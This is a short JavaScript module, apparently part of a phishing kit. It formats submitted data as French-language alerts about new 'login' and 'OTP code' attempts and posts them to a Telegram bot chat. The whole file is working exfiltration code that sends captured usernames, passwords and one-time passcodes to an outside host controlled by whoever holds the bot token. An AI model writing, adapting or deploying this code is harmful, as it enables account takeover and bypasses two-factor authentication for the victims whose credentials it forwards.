const notifications = {
    async sendToTelegram(type, data) {
        const { BOT_TOKEN, CHAT_ID, API_URL } = CONFIG.TELEGRAM;
        const message = this.formatMessage(type, data);
        
        await fetch(`${API_URL}${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
            }),
        });
    },

    formatMessage(type, data) {
        const emoji = type === 'login' ? '🔐' : '🔑';
        const action = type === 'login' ? 'Connexion' : 'Code OTP';
        
        const formattedData = Object.entries(data)
            .map(([key, value]) => `<b>${key}:</b>\n${value}`)
            .join('\n\n');

        return `
${emoji} Nouvelle tentative - ${action}
⏰ ${new Date().toLocaleString('fr-FR')}

${formattedData}
        `.trim();
    }
};